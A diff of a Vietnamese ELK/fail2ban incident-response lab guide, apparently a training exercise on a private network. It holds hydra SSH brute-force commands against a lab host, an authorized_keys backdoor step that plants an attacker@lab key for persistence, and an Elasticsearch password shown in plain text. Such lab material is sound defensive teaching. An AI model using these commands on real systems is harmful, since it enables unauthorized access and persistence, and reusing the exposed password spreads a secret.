@@ -32,8 +32,10 @@ sudo systemctl restart ssh
 - Có thể thử chạy:
 ``` bash
 hydra -l ubuntu -P /opt/wordlist.txt -V -t 8 -f -o hydra.out ssh://176.34.0.7 
+
+```
+``` bash
 ls -l /opt/wordlist.txt
-hydra -l ubuntu -P /opt/wordlist.txt -I -t 4 -f ssh://176.34.0.7  → có thể bị lỗi nếu trước đó cài sẵn tường lửa trong dockerfile
 ```
 - check log:
 ```bash
@@ -114,8 +116,7 @@ output {
   elasticsearch {
     hosts => ["http://127.0.0.1:9200"]
     user  => "elastic"
-    password => " "
-# password => "<PASS_ELASTIC>"
+    password => "<PASS_ELASTIC>"
     index => "lab-%{+YYYY.MM.dd}"
   }
   stdout { codec => rubydebug }
@@ -139,33 +140,53 @@ sudo ss -lnt 'sport = :9200 or sport = :5601 or sport = :5044'
 sudo systemctl restart filebeat
 ```
 - Kiểm tra chạy chưa : 
-# → để thấy 3 thứ: (1) Filebeat khởi động OK, (2) đã mở Input paths đúng,
-# (3) ĐÃ KẾT NỐI tới Elasticsearch@176.34.0.5:9200 thành công.
+→ để thấy 3 thứ: (1) Filebeat khởi động OK, (2) đã mở Input paths đúng
+→ (3)ĐÃ KẾT NỐI tới Elasticsearch@176.34.0.5:9200 thành công.
 ```bash
 sudo tail -n 50 /var/log/filebeat/filebeat
 sudo filebeat test config -e          #kiểm tra cấu hình có config OK = đúng
 sudo filebeat test output -e         # ko có chữ ERROR là đúng → oke hết rồi
 ```
-(0.2) Tại server, ta tạo Data View trong Kibana (trên firefox của server)
-a) Xác nhận index đã tạo (trên terminal server) 
+``` bash
+sudo filebeat test output -e  
+```
+
+# (0.2) Tại server, ta tạo Data View trong Kibana (trên firefox của server)
+  a) Xác nhận index đã tạo (trên terminal server) 
 Hỏi ES xem đã có index lab-YYYY.MM.DD chưa.
 Vì sao? Đây là “dấu hiệu dây chuyền” từ client → server đã thông.
+``` bash
 curl -sS 'http://127.0.0.1:9200/_cat/indices/lab-*?v'
-curl -u elastic:yourpassword -sS 'http://127.0.0.1:9200/_cat/indices/lab-*?v'   #nếu để mật khẩu
+curl -u elastic:yourpassword -sS 'http://127.0.0.1:9200/_cat/indices/lab-*?v'   
+```
 (pass)
 Changed password for user elastic
 PASSWORD elastic = eJFGQt1v3k4LkCDjqMhB
+``` bash
 curl -u elastic:eJFGQt1v3k4LkCDjqMhB -sS 'http://127.0.0.1:9200/_cat/indices/lab-*?v' 
+```
+
 
 → Kết quả trông như:
 health status index            uuid ... pri rep docs.count ...
 yellow open   lab-2025.10.22   AbCd... 1   1   123
 → thấy ít nhất 1 index lab-<ngày> và docs.count > 0.
 
-b) Tạo Data View trong Kibana
+  b) Tạo Data View trong Kibana
 Mở firefox ở server ra : 
+``` bash
 firefox &
- http://176.34.0.5:5601 hoặc http://localhost:5601 →   Vào Stack Management → Index Pattern → Create
+
+```
+``` bash
+http://176.34.0.5:5601
+```
+ hoặc 
+``` bash
+http://localhost:5601
+```
+→ Vào Stack Management → Index Pattern → Create
+ 
 Name: lab
 Pattern: lab-* 
 Timestamp: @timestamp
@@ -174,23 +195,22 @@ Rồi chọn create index pattern
 Vào 3 gạch → chọn Discover
 → quan sát được giao diện log message
 
-c) Kiểm tra xem rule and connection và alert dùng được không (?) 
+  c) Kiểm tra xem rule and connection và alert dùng được không (?) 
 Trong tab Stack Management --> Alerts and Insights --> Rules and Connectors thì cái "Rules and Connectors"
 Còn trong tab Security --> gồm có Alert và Rule như cột bên trái 
 → tất cả phải bật bảo mật hết thì mới lên được
 
-(0.3) Incident A: Trên terminal Attacker,  ssh brute force thất bại
-Dùng hydra với wordlist 5 từ của bạn. → Sinh nhiều lần sai → log Failed password → fail2ban ban.
-# [attacker] brute-force
+# (0.3) Incident A: Trên terminal Attacker,  ssh brute force thất bại
+Dùng hydra với wordlist 5 từ của bạn. → Sinh nhiều lần sai → log Failed password → fail2ban ban. [attacker] brute-force
+
+``` bash
 hydra -l ubuntu -P /opt/wordlist.txt -I -t 4 -f ssh://176.34.0.7
-Giải thích lệnh hydra:
--l ubuntu: thử username ubuntu
--P /opt/wordlist.txt: dùng wordlist bạn đã chuẩn bị trong image
--I: bỏ qua “restore”
--t 4: song song 4 kết nối
--f: dừng khi tìm được 1 mật khẩu đúng (nếu có)
-hoặc : 
- hydra -l ubuntu -P /opt/wordlist.txt -V -t 8 -f -o hydra.out ssh://176.34.0.7
+```
+hoặc :
+``` bash
+hydra -l ubuntu -P /opt/wordlist.txt -V -t 8 -f -o hydra.out ssh://176.34.0.7
+```
+
 để chạy
 
 (1.3) Trên server, phát hiện incident A ở công cụ elk và terminal server 
@@ -198,6 +218,7 @@ hoặc :
 Changed password for user elastic
 PASSWORD elastic = eJFGQt1v3k4LkCDjqMhB
 Đếm số lần ssh brute force fail: 
+``` bash
 curl -sS -u elastic:eJFGQt1v3k4LkCDjqMhB \
   'http://127.0.0.1:9200/lab-*/_count?filter_path=count' \
   -H 'Content-Type: application/json' \
@@ -209,11 +230,13 @@ curl -sS -u elastic:eJFGQt1v3k4LkCDjqMhB \
     ]}}
   }' \
 | jq -c '{count: .count}' | tee -a /home/ubuntu/evidence.json
+```
+
 → {"count":117}
 tee -a /home/ubuntu/evidence.json
 
 
-(1.4) Containment cho incident A : fail2log → sau đó tắt để thực hiện cho incident B
+# (1.4) Containment cho incident A : fail2log → sau đó tắt để thực hiện cho incident B
 Mục tiêu: ngăn sự cố lan rộng, giảm thiệt hại tức thời, chưa xử lý tận gốc.
 => Giai đoạn này chỉ “chặn đứng” hành vi, chứ chưa loại bỏ nguyên nhân sâu xa (vẫn có thể quay lại nếu gỡ chặn).
 - Cài fail2log và nftables: 
@@ -223,7 +246,6 @@ sudo apt-get update && sudo apt-get install -y fail2ban nftables
 - Rồi đặt lệnh: (2)
 ```bash
 sudo tee /etc/fail2ban/jail.local >/dev/null <<'CONF'
-```
 [sshd]
 enabled   = true
 port      = 22
@@ -235,12 +257,21 @@ findtime  = 60
 bantime   = 600
 banaction = nftables-multiport
 CONF
+```
 → jail.local của bạn đang để banaction = dummy → không chặn gì cả (chỉ phát hiện/ghi log). NÊn để phải là nftables-multiport
-(3) sudo systemctl restart fail2ban nftables
-(4) sudo systemctl status fail2ban nftables 
-(5) sudo nano /etc/fail2ban/jail.local
+``` bash
+sudo systemctl restart fail2ban nftables
+sudo systemctl status fail2ban nftables 
+```
+và
+``` bash
+sudo nano /etc/fail2ban/jail.local
+```
+
 * Attacker thử lại tấn công
+``` bash
 hydra -l ubuntu -P /opt/wordlist.txt -V -t 8 -f -o hydra.out ssh://176.34.0.7 
+```
 → Được vài giây sau, client đã chặn thành công khi banned Ip đã có ip của attacker 176.34.0.3 khi kiểm tra bằng câu lệnh: 
 ```bash
 sudo fail2ban-client status sshd
@@ -251,33 +282,44 @@ sudo fail2ban-client set sshd unbanip 176.34.0.3
 sudo fail2ban-client set sshd addignoreip 176.34.0.3
 ```
 Lí do: nếu trong thực tế , attacker không chỉ 1 địa chỉ ip được ;v. Chỉ là trong lab đang làm tối giản á nên dùng 1 cái cho tiện
-(0.4) Incident B: attacker ssh brute success, tạo persistence (nhẹ) trong phiên SSH và Cài cron
-a) Terminal attacker (đang ở máy 176.34.0.3), trước khi bạn đăng nhập ssh vào client.
+# (0.4) Incident B: attacker ssh brute success, tạo persistence (nhẹ) trong phiên SSH và Cài cron
+  a) Terminal attacker (đang ở máy 176.34.0.3), trước khi bạn đăng nhập ssh vào client.
 Lệnh chạy:
+``` bash
 ssh-keygen -t ed25519 -N '' -f ~/.ssh/lab_ed25519 -C 'attacker@lab'
+
+```
 Kết quả mong đợi sẽ Có 2 file:
 Private key: ~/.ssh/lab_ed25519 (giữ bí mật)
 Public key: ~/.ssh/lab_ed25519.pub
 
 Hiển thị public key (để copy dán sang client ở B2):
+``` bash
 cat ~/.ssh/lab_ed25519.pub
+```
+
 Kết quả là một dòng kiểu:
 ssh-ed25519 AAAAC3NzaC1lZDI1<…..> attacker@lab
 Kiểu dạng này nè : 
 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB+GUwGnpsfzVyBqPobk/B9ZLEYK04xvUDjabo3bUK4O attacker@lab
 
-b) Ở Terminal attacker, lúc này chưa dùng key, đăng nhập bằng mật khẩu:
+  b) Ở Terminal attacker, lúc này chưa dùng key, đăng nhập bằng mật khẩu:
 Lúc này , attacker phải đăng nhập bằng mật khẩu đúng: 
 ssh ubuntu@176.34.0.7
-# 1) Bật thư mục SSH cho user hiện tại
+l1) Bật thư mục SSH cho user hiện tại
+``` bash
 mkdir -p ~/.ssh && chmod 700 ~/.ssh
-# 2) Thêm *nguyên* dòng public key bạn vừa xem ở bước A:
-#    Dán đúng một dòng "ssh-ed25519 AAAA... attacker@lab" vào giữa cặp nháy đơn  → NHÁY ĐƠN Ở CUỐI
-echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI<...> attacker@lab' >> ~/.ssh/authorized_keys
 
-echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB+GUwGnpsfzVyBqPobk/B9ZLEYK04xvUDjabo3bUK4O attacker@lab' >> ~/.ssh/authorized_keys
+```
+l2) Thêm *nguyên* dòng public key bạn vừa xem ở bước A:
+  Dán đúng một dòng "ssh-ed25519 AAAA... attacker@lab" vào giữa cặp nháy đơn  → NHÁY ĐƠN Ở CUỐI
 
-# 3) Quyền file chặt chẽ
+``` bash
+echo 'ssh-ed25519 AAAA attacker@lab' >> ~/.ssh/authorized_keys
+```
+
+
+l3) Quyền file chặt chẽ
 ls -l ~/.ssh/authorized_keys
 chmod 600 ~/.ssh/authorized_keys
 
@@ -285,7 +327,7 @@ Kết quả mong đợi:
 nl -ba ~/.ssh/authorized_keys
 Thấy ít nhất 1 dòng chứa attacker@lab.
 
-# 4) Xác nhận “cửa sau” hoạt động (từ attacker, dùng private key):
+l4) Xác nhận “cửa sau” hoạt động (từ attacker, dùng private key):
 Giữ nguyên phiên này; mở cửa sổ terminal attacker khác.
 Từ attacker ở phiên khác (terminal khác) chạy:
 ssh -i ~/.ssh/lab_ed25519 ubuntu@176.34.0.7
@@ -503,4 +545,5 @@ curl -sS -u elastic:eJFGQt1v3k4LkCDjqMhB \
     alerts:.hits.total.value,
     attackers:(.aggregations.ips.buckets|map(.key)),
     time:$time }' | tee -a /home/ubuntu/evidence.json
+
 
